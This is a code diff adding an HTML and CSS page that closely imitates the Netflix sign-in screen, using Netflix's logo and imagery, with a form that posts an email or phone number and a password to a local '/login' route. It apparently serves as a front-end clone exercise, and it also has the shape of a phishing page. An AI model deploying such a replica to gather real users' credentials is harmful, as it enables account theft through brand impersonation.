@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Sign In</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #000;
+            color: #fff;
+        }
+
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.5;
+            background: url('https://assets.nflxext.com/ffe/siteui/vlv3/ab180c27-13a4-4a69-80a0-524e53f7b9c5/6875c12f-198c-4e21-9dd2-2d2c31d2c6d5/IR-en-20241007-popsignuptwoweeks-perspective_alpha_website_large.jpg') no-repeat center center/cover;
+            z-index: -1;
+        }
+
+        nav {
+            position: relative;
+            z-index: 1;
+            padding: 20px 50px;
+        }
+
+        nav a img {
+            width: 167px;
+        }
+
+        .form-wrapper {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            width: 450px;
+            padding: 60px;
+            background: rgba(0, 0, 0, 0.75);
+            border-radius: 4px;
+        }
+
+        .form-wrapper h2 {
+            margin-bottom: 28px;
+            font-size: 32px;
+        }
+
+        .form-control {
+            position: relative;
+            margin-bottom: 16px;
+        }
+
+        .form-control input {
+            width: 100%;
+            height: 50px;
+            padding: 16px 20px 0;
+            background: #333;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .form-control label {
+            position: absolute;
+            top: 50%;
+            left: 20px;
+            transform: translateY(-50%);
+            color: #8c8c8c;
+            pointer-events: none;
+            transition: all 0.2s ease;
+        }
+
+        .form-control input:focus + label,
+        .form-control input:valid + label {
+            font-size: 11px;
+            top: 15px;
+            transform: translateY(0);
+        }
+
+        .form-wrapper button {
+            width: 100%;
+            padding: 16px;
+            margin: 24px 0 12px;
+            background: #e50914;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .form-wrapper button:hover {
+            background: #c40812;
+        }
+
+        .form-help {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #b3b3b3;
+            margin-bottom: 50px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+        }
+
+        .remember-me input {
+            margin-right: 5px;
+            accent-color: #737373;
+        }
+
+        .form-help a {
+            color: #b3b3b3;
+            text-decoration: none;
+        }
+
+        .form-help a:hover {
+            text-decoration: underline;
+        }
+
+        .form-wrapper p {
+            color: #737373;
+            margin-bottom: 15px;
+        }
+
+        .form-wrapper p a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        .form-wrapper p a:hover {
+            text-decoration: underline;
+        }
+
+        .form-wrapper small {
+            display: block;
+            font-size: 13px;
+            color: #8c8c8c;
+            line-height: 1.4;
+        }
+
+        .form-wrapper small a {
+            color: #0071eb;
+            text-decoration: none;
+        }
+
+        .form-wrapper small a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 740px) {
+            body::before {
+                background: #000;
+                opacity: 1;
+            }
+
+            nav {
+                padding: 15px 20px;
+            }
+
+            nav a img {
+                width: 100px;
+            }
+
+            .form-wrapper {
+                width: 100%;
+                padding: 20px;
+                top: 40%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="#">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo">
+        </a>
+    </nav>
+    <div class="form-wrapper">
+        <h2>Sign In</h2>
+        <form action="/login" method="POST">
+            <div class="form-control">
+                <input type="text" name="userid" required>
+                <label>Email or phone number</label>
+            </div>
+            <div class="form-control">
+                <input type="password" name="password" required>
+                <label>Password</label>
+            </div>
+            <button type="submit">Sign In</button>
+            <div class="form-help">
+                <div class="remember-me">
+                    <input type="checkbox" id="remember">
+                    <label for="remember">Remember me</label>
+                </div>
+                <a href="#">Need help?</a>
+            </div>
+        </form>
+        <p>New to Netflix? <a href="#">Sign up now</a>.</p>
+        <small>
+            This page is protected by Google reCAPTCHA to ensure you're not a bot.
+            <a href="#">Learn more</a>.
+        </small>
+    </div>
+</body>
+</html>
